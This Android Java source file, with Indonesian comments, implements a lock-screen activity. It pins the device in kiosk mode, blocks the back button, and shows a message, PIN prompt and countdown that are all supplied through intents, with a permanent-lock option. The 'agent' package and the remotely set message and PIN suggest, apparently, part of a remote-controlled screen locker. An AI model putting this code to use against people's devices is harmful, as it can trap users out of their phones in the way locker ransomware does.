package com.ezax.agent;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.widget.TextView;
import android.widget.Toast;

public class LockScreenActivity extends Activity {

    private TextView tvPesan, tvTimer, tvPinDisplay;
    private StringBuilder inputPin = new StringBuilder();
    private String correctPin = "1234"; 
    private long timerDuration = 0;
    private CountDownTimer countDownTimer;
    private boolean isLocked = false; // Penanda lagi di Kiosk Mode atau nggak

    private BroadcastReceiver unlockReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            unlockScreen();
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_lock);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            startLockTask(); 
            isLocked = true;
        }

        registerReceiver(unlockReceiver, new IntentFilter("UNLOCK_SCREEN_ACTION"));

        tvPesan = findViewById(R.id.tv_pesan);
        tvTimer = findViewById(R.id.tv_timer);
        tvPinDisplay = findViewById(R.id.tv_pin_display);

        if (getIntent().hasExtra("PESAN")) tvPesan.setText(getIntent().getStringExtra("PESAN"));
        if (getIntent().hasExtra("PIN")) {
            correctPin = getIntent().getStringExtra("PIN").trim();
            if(correctPin.isEmpty()) correctPin = "1234"; 
        }
        if (getIntent().hasExtra("TIMER")) timerDuration = getIntent().getLongExtra("TIMER", 0);

        setupKeypad();
        startTimer();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        if (intent.hasExtra("ACTION") && "FINISH".equals(intent.getStringExtra("ACTION"))) {
            unlockScreen();
        }
    }

    private void setupKeypad() {
        int[] btnIds = {R.id.btn_0, R.id.btn_1, R.id.btn_2, R.id.btn_3, R.id.btn_4, R.id.btn_5, R.id.btn_6, R.id.btn_7, R.id.btn_8, R.id.btn_9};
        for (int i = 0; i < btnIds.length; i++) {
            final String number = String.valueOf(i);
            findViewById(btnIds[i]).setOnClickListener(v -> {
                if (inputPin.length() < correctPin.length()) {
                    inputPin.append(number);
                    updatePinDisplay();
                    checkPin();
                }
            });
        }
        findViewById(R.id.btn_del).setOnClickListener(v -> {
            if (inputPin.length() > 0) {
                inputPin.deleteCharAt(inputPin.length() - 1);
                updatePinDisplay();
            }
        });
    }

    private void updatePinDisplay() {
        StringBuilder masked = new StringBuilder();
        for (int i = 0; i < inputPin.length(); i++) masked.append("*");
        tvPinDisplay.setText(masked.toString());
    }

    private void checkPin() {
        if (inputPin.length() == correctPin.length()) {
            if (inputPin.toString().equals(correctPin)) {
                Toast.makeText(this, "PIN BENAR!", Toast.LENGTH_SHORT).show();
                unlockScreen();
            } else {
                Toast.makeText(this, "PIN SALAH!", Toast.LENGTH_SHORT).show();
                inputPin.setLength(0);
                updatePinDisplay();
            }
        }
    }

    private void startTimer() {
        if (timerDuration > 0) {
            countDownTimer = new CountDownTimer(timerDuration * 1000, 1000) {
                @Override
                public void onTick(long millisUntilFinished) {
                    long hours = millisUntilFinished / 3600000;
                    long minutes = (millisUntilFinished % 3600000) / 60000;
                    long seconds = (millisUntilFinished % 60000) / 1000;
                    tvTimer.setText(String.format("DIBUKA DALAM : %02d:%02d:%02d", hours, minutes, seconds));
                }
                @Override
                public void onFinish() { 
                    unlockScreen(); 
                }
            }.start();
        } else {
            tvTimer.setText("DIBUKA DALAM : PERMANEN");
        }
    }

    // --- FUNGSI SAKTI BUAT KELUAR DARI KIOSK MODE ---
    private void unlockScreen() {
        if (countDownTimer != null) countDownTimer.cancel();
        try {
            if (isLocked && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                stopLockTask(); // Wajib matiin kiosk mode dulu
                isLocked = false;
            }
            finishAndRemoveTask(); // Tutup activity dan hapus dari history
        } catch (Exception e) {
            finish();
        }
    }

    @Override
    public void onBackPressed() { }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (countDownTimer != null) countDownTimer.cancel();
        try { unregisterReceiver(unlockReceiver); } catch (Exception e) {}
    }
}
